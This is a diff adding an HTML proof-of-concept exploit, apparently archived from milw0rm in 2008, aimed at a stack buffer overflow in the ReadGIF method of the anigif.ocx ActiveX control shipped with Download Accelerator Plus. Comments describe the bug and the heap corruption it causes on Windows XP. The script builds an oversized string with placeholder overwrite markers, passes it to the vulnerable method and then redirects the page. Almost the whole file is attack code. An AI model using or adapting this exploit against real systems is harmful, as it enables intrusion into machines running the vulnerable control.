@@ -1,0 +1,32 @@
+<html>
+<body>
+<object classid='clsid:82351441-9094-11D1-A24B-00A0C932C7DF' id='target' />
+</object>
+<script language=javascript>
+
+// anigif.ocx by www.jcomsoft.com can be found distribuited with some applications, 
+// I found it in Download Accelerator Plus 6.8. 
+// DAP comes with an old version, but the last from jcomsoft is also vulnerable:
+// there's a stack-based buffer overflow in the ReadGIF and ReadGIF2 methods, 
+// the funny thing is that after the first exception that will be handled by IE,
+// when the object is released we reach RtlpCoalesceFreeBlocks owning eax and ecx 
+// with windogs xp sp1 or the second check of safe-unlink with sp2 in a standard heap 
+// overflow scenario.
+
+var buf;
+for (var i=0; i<259; i++) buf += "X";
+
+buf +="BBBB";
+buf += "CCCC";
+
+for (var i=0; i<5728; i++) buf += "H";
+
+target.ReadGIF(buf);
+
+window.location = "http://www.google.com";
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2008-08-10]
